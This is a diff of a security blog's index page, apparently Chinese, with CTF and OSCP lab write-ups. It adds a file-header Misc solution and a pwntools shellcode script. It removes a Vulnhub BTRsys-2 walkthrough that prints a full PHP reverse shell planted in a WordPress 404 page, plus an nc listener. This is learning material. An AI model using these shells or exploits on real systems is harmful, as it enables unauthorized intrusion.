@@ -137,6 +137,89 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2023/10/03/miscpic/" >Misc-bronken picture_1</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-10-03  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>题目为打不开的图片，下载附件后用winhex打开：<br><img src="/images/miscpic1.JPG"><br>发现是一个图片文件，有exif信息但是无法打开</p>
+<h1 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h1><p>上网搜索相关信息，发现一种修改文件头的题型，检查发现图片的文件尾是jpeg图片的文件尾，但文件头经过修改，将文件头修改为jpeg的可以打开图片：<br><img src="/images/miscpic2.JPG"><br><img src="/images/miscpic3.JPG"><br>是一张西电的风景图</p>
+<h1 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h1><p>查看文件属性，发现有flag的提示：<br><img src="/images/miscpic4.JPG"><br>猜测是hex格式的flag，进行hex转字符后得到flag：<br><img src="/images/miscpicflag.JPG"></p>
+<h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.第一次做做到解密flag的时候卡住了，不知道这是hex码，以后知道了<br>2.附上关于文件头隐写的知识：<br>常见文件文件头和隐写术总结 CTF中Misc必备<br>前言</p>
+<p>对常见文件文件头和隐写术做个归纳总结</p>
+<pre><code>文件头文件尾
+图片隐写
+音频隐写
+电子文档隐写
+</code></pre>
+	
+	</div>
+  <a type="button" href="/2023/10/03/miscpic/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2023/10/02/pwnshell0/" >PWN-shellcode_level0</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-10-02  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>题目直接说了是shellcode，而且可以脚本一把梭，那就试试看吧</p>
+<h1 id="检查安全性"><a href="#检查安全性" class="headerlink" title="检查安全性"></a>检查安全性</h1><p>先下载附件，放到kali里面用checksec检查一下：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">checksec shellcode_level0 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/root/pwn/MoeCTF/shellcode0/shellcode_level0'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>回显显示，没有任何过滤（canary found，NX disabled），可以尝试使用shellcraft构造shellcode</p>
+<h1 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h1><p>一把梭的脚本如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment"># r = process('./shellcode_level0')</span>
+r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">43039</span><span class="token punctuation">)</span>
+context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="Get-Flag"><a href="#Get-Flag" class="headerlink" title="Get Flag"></a>Get Flag</h1>
+	
+	</div>
+  <a type="button" href="/2023/10/02/pwnshell0/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2023/10/02/meoupload/" >Web-another upload</a>
 		</h3>
 		</div>
@@ -359,151 +442,6 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2023/09/05/OSCPBTR/" >OSCP-Easy-BTRsys</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-09-05  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="OSCP备考靶机总结"><a href="#OSCP备考靶机总结" class="headerlink" title="OSCP备考靶机总结"></a>OSCP备考靶机总结</h1><h2 id="初级阶段"><a href="#初级阶段" class="headerlink" title="初级阶段"></a>初级阶段</h2><h3 id="Vulnhub"><a href="#Vulnhub" class="headerlink" title="Vulnhub"></a>Vulnhub</h3><h4 id="BTRsys-2"><a href="#BTRsys-2" class="headerlink" title="BTRsys-2"></a>BTRsys-2</h4><p><img src="/images/OSCPBTR/BTRsys1.JPG"><br>fscan扫描可知开放了ftp和网页端，其中ftp允许匿名登录，但尝试登陆后没有文件，所以先将注意力放在web页面，对其进行目录扫描发现robots.txt，并发现隐藏的&#x2F;wordpress目录，访问发现是wordpress博客，在页面中找到登录地址，使用弱口令admin&#x2F;admin进入后台<br>在后台一番查找，尝试以文件上传等方式getshell均失败，看提示得知可以通过修改博客的主题外观插件来getshell，我们先修改其主题外观插件的404页面<br>使用在线生成shell网站：<a target="_blank" rel="noopener" href="https://shell.nctry.com/">https://shell.nctry.com/</a><br>生成php反弹shell：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token comment">// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</span>
-<span class="token comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>
-
-<span class="token function">set_time_limit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$VERSION</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1.0"</span><span class="token punctuation">;</span>
-<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'192.168.36.132'</span><span class="token punctuation">;</span>
-<span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">;</span>
-<span class="token variable">$chunk_size</span> <span class="token operator">=</span> <span class="token number">1400</span><span class="token punctuation">;</span>
-<span class="token variable">$write_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
-<span class="token variable">$error_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
-<span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uname -a; w; id; sh -i'</span><span class="token punctuation">;</span>
-<span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token variable">$debug</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pcntl_fork'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-	<span class="token variable">$pid</span> <span class="token operator">=</span> <span class="token function">pcntl_fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	
-	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't fork"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-	
-	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Parent exits</span>
-	<span class="token punctuation">&#125;</span>
-	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">posix_setsid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error: Can't setsid()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-
-	<span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token comment">// Open reverse connection</span>
-<span class="token variable">$sock</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (<span class="token interpolation"><span class="token variable">$errno</span></span>)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token variable">$descriptorspec</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
-   <span class="token number">0</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// stdin is a pipe that the child will read from</span>
-   <span class="token number">1</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// stdout is a pipe that the child will write to</span>
-   <span class="token number">2</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span>   <span class="token comment">// stderr is a pipe that the child will write to</span>
-<span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token variable">$process</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">,</span> <span class="token variable">$descriptorspec</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't spawn shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successfully opened reverse shell to <span class="token interpolation"><span class="token variable">$ip</span></span>:<span class="token interpolation"><span class="token variable">$port</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell connection terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token keyword">break</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-
-	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell process terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token keyword">break</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-
-	<span class="token variable">$read_a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token variable">$num_changed_sockets</span> <span class="token operator">=</span> <span class="token function">stream_select</span><span class="token punctuation">(</span><span class="token variable">$read_a</span><span class="token punctuation">,</span> <span class="token variable">$write_a</span><span class="token punctuation">,</span> <span class="token variable">$error_a</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-
-	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-
-	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">function</span> <span class="token function-definition function">printit</span> <span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$daemon</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">print</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$string</span></span>\n"</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>网站上还有很多其他的反弹shell，实战时可根据自己需求选择，修改404页面结果如下：<br><img src="/images/OSCPBTR/BTRsys2.JPG"><br>我们使用<code>nc -lvnp 10000</code>先开启监听，然后访问一个不存在的页面以触发404页面<br><strong>官方做法：访问插件404页面路径位置 “&#x2F;wp-content&#x2F;themes&#x2F;twentyfourteen&#x2F;404.php”</strong><br>即可获得一个反弹shell<br>随后使用两个经典linux提权脚本：<br>1.linux-exploit-suggester<br><a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a><br>2.linpeas.sh<br><a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng/releases">https://github.com/peass-ng/PEASS-ng/releases</a><br>按照脚本给出的提权建议一个个尝试即可成功提权</p>
-
-	
-	</div>
-  <a type="button" href="/2023/09/05/OSCPBTR/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
 			<a href="/2023/09/05/http/" >Web-http</a>
 		</h3>
 		</div>
@@ -562,40 +500,6 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2023/08/28/webxxe/" >Web-XML External Entity Injection(XXE)</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-08-28  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p><img src="/images/webxxe1.PNG"></p>
-<p><img src="/images/webxxe2.PNG"></p>
-<p>题目给出了一个网站，点击左侧相应的汽车名字就会出现相应的图片和数据。一看没什么问题，那么我们就上burp，给浏览器设置代理，访问192.168.1.101，为什么不是127.0.0.1呢？因为访问这个回环地址burp抓不到包，原因未知但可以使用就好了。</p>
-<p><img src="/images/webxxecap1.PNG"></p>
-<p>观察发现，当我们点击左侧汽车名字的时候，实际上我们是post了相应的请求，抓包修改相应位置的汽车名后发现会跳转到不同的汽车页面。思路这就来了：如果我们post一些其他的东西上去，是否会有突破口？</p>
-<h1 id="尝试突破"><a href="#尝试突破" class="headerlink" title="尝试突破"></a>尝试突破</h1><p>首先，我先post了一个不存在的汽车名称：</p>
-<p><img src="/images/webxxefake1.PNG"></p>
-<p>得到这样一个结果：</p>
-	
-	</div>
-  <a type="button" href="/2023/08/28/webxxe/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -641,7 +545,7 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
 			
 <div class="widget tag">
   <h3 class="title">Categories</h3>
-     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SRC%E6%8C%96%E6%8E%98/">SRC挖掘</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/">个人项目</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/">竞赛</a><span class="category-list-count">21</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/AWD/">AWD</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/">CTF</a><span class="category-list-count">20</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Classical-Crypto/">Classical Crypto</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Misc/">Misc</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/PWN/">PWN</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Reverse/">Reverse</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Web/">Web</a><span class="category-list-count">9</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/">速查</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/%E5%8D%9A%E5%AE%A2/">博客</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">靶场练习</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/">OSCP</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Easy/">Easy</a><span class="category-list-count">1</span></li></ul></li></ul></li></ul> 
